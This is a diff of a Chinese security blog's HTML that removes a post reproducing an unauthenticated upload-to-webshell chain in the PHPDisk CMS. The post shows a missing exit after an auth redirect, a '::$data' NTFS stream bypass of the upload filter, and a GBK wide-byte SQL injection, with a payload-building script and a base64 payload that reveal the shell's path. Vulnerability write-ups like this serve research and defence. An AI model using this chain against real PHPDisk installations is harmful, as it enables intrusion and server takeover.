-            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>跟着同学复现了一波,前台Getshell<br>参考链接:<br><a href="https://od0d.cn/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">phpdisk前台Getshell(复现)</a><br><a href="https://xz.aliyun.com/t/5594#toc-1" target="_blank" rel="noopener">代码审计 xxxdisk前台Getshell</a></p>
-<h1 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h1><p>选择的cms是phpdisk，在Windows平台的GBK版本上，挖掘到了一个无需登录的前台Getshell。</p>
-<p>同学告诉我，在审计初，最好要看看该cms的路由和全局变量过滤情况<br>然后查看之后确实是存在文件dosafe.php，将所有sql注入的参数过滤了个遍。</p>
-<h1 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h1><p>(1)从mydisk.php为权限判断未exit导致可以越权访问mydisk.php</p>
-<p>(2)利用windows下的NTFS ADS流trick绕过文件名后缀限制</p>
-<p>(3)通过phpdisk的版本iconv编码转化使用不当造成宽字节注入找到后台(已知漏洞)</p>
-<h1 id="0x03-文件上传漏洞"><a href="#0x03-文件上传漏洞" class="headerlink" title="0x03 文件上传漏洞"></a>0x03 文件上传漏洞</h1><p>用户注册后尝试上传一个php文件，到服务器中查看该文件，会发现该文件被转成txt类型的文件<br><img src="/2019/07/11/xxxdisk前台Getshell-复现/1.png" alt=""></p>
-<p>然后看看怎么绕过这个后缀限制,文件上传操作封装在函数<strong>upload_file()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpdisk/includes/function/global.func.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">($source, $target)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (function_exists(<span class="string">'move_uploaded_file'</span>) &amp;&amp; @move_uploaded_file($source, $target)) &#123;</span><br><span class="line">		@chmod($target, <span class="number">0666</span>);</span><br><span class="line">		<span class="keyword">return</span> $target;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (@copy($source, $target)) &#123;</span><br><span class="line">		@chmod($target, <span class="number">0666</span>);</span><br><span class="line">		<span class="keyword">return</span> $target;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (@is_readable($source)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($fp = @fopen($source,<span class="string">'rb'</span>)) &#123;</span><br><span class="line">			@flock($fp,<span class="number">2</span>);</span><br><span class="line">			$filedata = @fread($fp,@filesize($source));</span><br><span class="line">			@fclose($fp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($fp = @fopen($target, <span class="string">'wb'</span>)) &#123;</span><br><span class="line">			@flock($fp, <span class="number">2</span>);</span><br><span class="line">			@fwrite($fp, $filedata);</span><br><span class="line">			@fclose($fp);</span><br><span class="line">			@chmod ($target, <span class="number">0666</span>);</span><br><span class="line">			<span class="keyword">return</span> $target;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>然後查看哪些地方調用了該函數，該函數調用有兩處，我們這次的漏洞在第一處，<br>位于<strong>phpdisk/modules/upload.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码第70行</span></span><br><span class="line">...</span><br><span class="line">$file_ext = get_real_ext($file_extension);</span><br><span class="line">$dest_file = $file_real_path.$file_store_path.$file_real_name_store.$file_ext;</span><br><span class="line"><span class="keyword">if</span>(upload_file($file[<span class="string">'tmp_name'</span>],$dest_file))&#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>使用函数<strong>get_real_ext()</strong>来处理后缀<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpdisk/includes/function/global.func.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_real_ext</span><span class="params">($file_extension)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $settings;</span><br><span class="line">	$file_extension = trim($file_extension);</span><br><span class="line">	<span class="keyword">if</span>($file_extension)&#123;</span><br><span class="line">		$exts = explode(<span class="string">','</span>,$settings[<span class="string">'filter_extension'</span>]);</span><br><span class="line">		<span class="keyword">if</span>(in_array($file_extension,$exts))&#123;</span><br><span class="line">			$file_ext = <span class="string">'.'</span>.$file_extension.<span class="string">'.txt'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$file_ext = <span class="string">'.'</span>.$file_extension;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$file_ext = <span class="string">'.txt'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $file_ext;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>使用黑名单filter_extension对后缀名进行修改添加<code>.txt</code>防止像php这样的恶意文件。<br>filter_extension位于：<code>/admin/setting.inc.php/38行</code><br>此处绕过的方法，是<strong>我们控制文件名为：<code>test.php::$data</code></strong>，就可以绕过。</p>
-<p>原理：<br>php在window的时候如果文件名为：文件名+<strong>::$DATA</strong>，此时会把<strong>::$DATA</strong>之后的数据当成文件流处理,不会检测后缀名.且保持<strong>::$DATA</strong>之前的文件名。</p>
-<p>参考:<a href="https://xz.aliyun.com/t/2539#toc-0" target="_blank" rel="noopener">渗透测试的WINDOWS NTFS技巧集合</a></p>
-<h1 id="0x04-权限绕过"><a href="#0x04-权限绕过" class="headerlink" title="0x04 权限绕过"></a>0x04 权限绕过</h1><p>关键代码<code>mydisk.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">#	Project: PHPDISK File Storage Solution</span></span><br><span class="line"><span class="comment">#	This is NOT a freeware, use is subject to license terms.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	Site: http://www.phpdisk.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	$Id: mydisk.php 25 2014-01-10 03:13:43Z along $</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	Copyright (C) 2008-2014 PHPDisk Team. All Rights Reserved.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"includes/commons.inc.php"</span>;</span><br><span class="line"></span><br><span class="line">phpdisk_core::user_login();</span><br><span class="line"></span><br><span class="line">define(<span class="string">'IN_MYDISK'</span> ,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fix firefox</span></span><br><span class="line"><span class="keyword">if</span>($item ==<span class="string">'upload'</span>)&#123;</span><br><span class="line">	$uid = (int)gpc(<span class="string">'uid'</span>,<span class="string">'GP'</span>,<span class="number">0</span>);</span><br><span class="line">	$pd_is_activated = @$db-&gt;result_first(<span class="string">"select is_activated from &#123;$tpf&#125;users where userid='$uid'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure></p>
-<p>查看<code>phpdisk_core::user_login()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">user_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $pd_uid,$pd_pwd;</span><br><span class="line">		<span class="keyword">if</span>(!$pd_uid || !$pd_pwd)&#123;</span><br><span class="line">			header(<span class="string">"Location: "</span>.urr(<span class="string">"account"</span>,<span class="string">"action=login&amp;ref="</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>]));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>这里认证没有通过仅仅只是302，并没有退出程序，当时不理解302为什么可以？<br>同学告诉我，302的话，就算没有在没有注册的情况下，程序检测到后，不会强制退出程序，而是继续执行mydisk.php接下来的代码</p>
-<h1 id="0x05-未授权上传"><a href="#0x05-未授权上传" class="headerlink" title="0x05 未授权上传"></a>0x05 未授权上传</h1><p><img src="/2019/07/11/xxxdisk前台Getshell-复现/2.png" alt=""><br>上传成功</p>
-<h1 id="0x06-宽字节注入"><a href="#0x06-宽字节注入" class="headerlink" title="0x06 宽字节注入"></a>0x06 宽字节注入</h1><p>此程序分为两个版本utf-8与gbk版，所以难免会有一些编码转换的地方，所以也难免发生不小心没有注意的地方。<br>函数<strong>convert_str()</strong>提供编码转换的功能<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glbal.inc.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert_str</span><span class="params">($in,$out,$str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $db;</span><br><span class="line">	$str = $db-&gt;escape($str);</span><br><span class="line">	<span class="keyword">if</span>(function_exists(<span class="string">"iconv"</span>))&#123;</span><br><span class="line">		$str = iconv($in,$out,$str);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(function_exists(<span class="string">"mb_convert_encoding"</span>))&#123;</span><br><span class="line">		$str = mb_convert_encoding($str,$out,$in);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $db-&gt;escape($str);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>查看调用该函数的文件，此处利用ajax.php一次宽字节注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ajax.php</span></span><br><span class="line"><span class="keyword">switch</span>($action)&#123;</span><br><span class="line">	...</span><br><span class="line">    $data = trim(gpc(<span class="string">'data'</span>,<span class="string">'P'</span>,<span class="string">''</span>));	</span><br><span class="line">    <span class="keyword">if</span>(strpos($data,<span class="string">','</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">	   $file = unserialize(base64_decode($data));</span><br><span class="line">				<span class="comment">/*foreach($file as $k=&gt;$v)&#123;</span></span><br><span class="line"><span class="comment">				$file[$k] = $db-&gt;escape($file[$v]);</span></span><br><span class="line"><span class="comment">				&#125;*/</span></span><br><span class="line">				$file[file_id] = (int)$file[file_id];</span><br><span class="line">				$file[file_size] = (int)$file[file_size];</span><br><span class="line">				$file[file_description] = $db-&gt;escape(trim($file[file_description]));</span><br><span class="line">				$file[file_extension] = $db-&gt;escape(trim($file[file_extension]));</span><br><span class="line">				$file[file_name] = $db-&gt;escape(trim($file[file_name]));</span><br><span class="line">				$num = @$db-&gt;result_first(<span class="string">"select count(*) from &#123;$tpf&#125;files where yun_fid='&#123;$file[file_id]&#125;' and userid='$pd_uid'"</span>);</span><br><span class="line">				<span class="keyword">if</span>($num &amp;&amp; $file[file_id])&#123;</span><br><span class="line">					$tmp_ext = $file[file_extension] ? <span class="string">'.'</span>.$file[file_extension] : <span class="string">''</span>;</span><br><span class="line">					$msg = $file[file_name].$tmp_ext;</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					$report_status =<span class="number">0</span>;</span><br><span class="line">					$report_arr = explode(<span class="string">','</span>,$settings[<span class="string">'report_word'</span>]);</span><br><span class="line">					<span class="keyword">if</span>(count($report_arr))&#123;</span><br><span class="line">						<span class="keyword">foreach</span>($report_arr <span class="keyword">as</span> $value)&#123;</span><br><span class="line">							<span class="keyword">if</span> (strpos($file[<span class="string">'file_name'</span>],$value) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">								$report_status = <span class="number">2</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$ins = <span class="keyword">array</span>(</span><br><span class="line">					<span class="string">'yun_fid'</span> =&gt; $file[file_id],</span><br><span class="line">					<span class="string">'file_name'</span> =&gt; $file[file_name],</span><br><span class="line">					<span class="string">'file_key'</span> =&gt; $file_key,</span><br><span class="line">					<span class="string">'file_extension'</span> =&gt; $file[file_extension],</span><br><span class="line">					<span class="string">'file_mime'</span> =&gt; <span class="string">'application/octet-stream'</span>,</span><br><span class="line">					<span class="string">'file_description'</span> =&gt; $file[file_description],</span><br><span class="line">					<span class="string">'file_size'</span> =&gt; $file[<span class="string">'file_size'</span>],</span><br><span class="line">					<span class="string">'file_time'</span> =&gt; $timestamp,</span><br><span class="line">					<span class="string">'is_checked'</span> =&gt; $is_checked,</span><br><span class="line">					<span class="string">'in_share'</span> =&gt; $in_share,</span><br><span class="line">					<span class="string">'report_status'</span> =&gt; $report_status,</span><br><span class="line">					<span class="string">'userid'</span> =&gt; $pd_uid,</span><br><span class="line">					<span class="string">'folder_id'</span> =&gt; $folder_id ? $folder_id : <span class="number">-1</span>,</span><br><span class="line">					<span class="string">'ip'</span> =&gt; $onlineip,</span><br><span class="line">					);</span><br><span class="line">					$sql = <span class="string">"insert into &#123;$tpf&#125;files set "</span>.$db-&gt;sql_array($ins).<span class="string">";"</span>;</span><br><span class="line">					$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br><span class="line">				&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></p>
-<p>关键代码在：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into &#123;$tpf&#125;files set "</span>.$db-&gt;sql_array($ins).<span class="string">";"</span>;</span><br><span class="line">$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br></pre></td></tr></table></figure></p>
-<p>跟进函数<strong>sql_array()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_array</span> <span class="params">($arr)</span></span>&#123;</span><br><span class="line">		$ins = <span class="keyword">array</span>();</span><br><span class="line">		reset($arr);</span><br><span class="line">		<span class="keyword">while</span>(<span class="keyword">list</span>($c, $v) = each($arr))&#123;</span><br><span class="line">			$ins[] = ($v === <span class="keyword">NULL</span> ? sprintf(<span class="string">'`%s`=NULL'</span>, $c) : sprintf(<span class="string">'`%s`=\'%s\''</span>, $c, $v));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> implode(<span class="string">', '</span>, $ins);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
-<p>并且<strong>$ins</strong>=&gt;<strong>$file = unserialize(base64_decode($data))</strong>=&gt;<strong>$data = trim(gpc(‘data’,’P’,’’))</strong><br>所以我们可以传入$data,来控制$ins的值<br>将我们的输入base64解码后，反序列化成数组对象，最后传入sql语句。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br></pre></td></tr></table></figure></p>
-<p>最后执行语句的时候存在一处编码转换，也是这里直接导致了注入。<br>汉字在utf下为三个字节，在gbk下为两个字节，故而当我们传入的单引号被转义后<strong>\’</strong>，该单引号将会连同前三个字节在GBK下，被解释为两个字符，使得单引号逃逸。</p>
-<h1 id="0x07-漏洞复现"><a href="#0x07-漏洞复现" class="headerlink" title="0x07  漏洞复现"></a>0x07  漏洞复现</h1><p>(1)无权限下上传shell(刚才已上传过shell.php)<br>(2)上传成功后通过sql注入获取shell文件的位置。<br>需要获取文件位置，那么我们需要一个可以回显文件位置的地方，这里存在回显的地方，我们在页面上看，也就标签处可以回显，也就是file_description，故而构造payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"file_id"</span>=&gt;<span class="string">"17007"</span>,<span class="string">"file_name"</span>=&gt;<span class="string">"od錦',`in_share`=1,`file_description`=(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_extension=0x7068703a3a2464617461)x)#"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjc6ImZpbGVfaWQiO3M6NDoiMTAwMCI7czo5OiJmaWxlX25hbWUiO3M6MTYyOiK5/icsYGluX3NoYXJlYD0xLGBmaWxlX2Rlc2NyaXB0aW9uYD0oc2VsZWN0IHguYSBmcm9tIChzZWxlY3QgY29uY2F0KGZpbGVfc3RvcmVfcGF0aCxmaWxlX3JlYWxfbmFtZSlhIGZyb20gcGRfZmlsZXMgd2hlcmUgZmlsZV9leHRlbnNpb249MHg3MDY4NzAzYTNhMjQ2NDYxNzQ2MSl4KSMiO30=</span><br></pre></td></tr></table></figure></p>
-<p>不知道为什么这台电脑的数据库死活传不入数据库，但是复现的过程就是这样，可以参考参考链接的文章。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2100,7 +2090,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-count">69</span>
           <span class="site-state-item-name">Artikel</span>
         </a>
       </div>
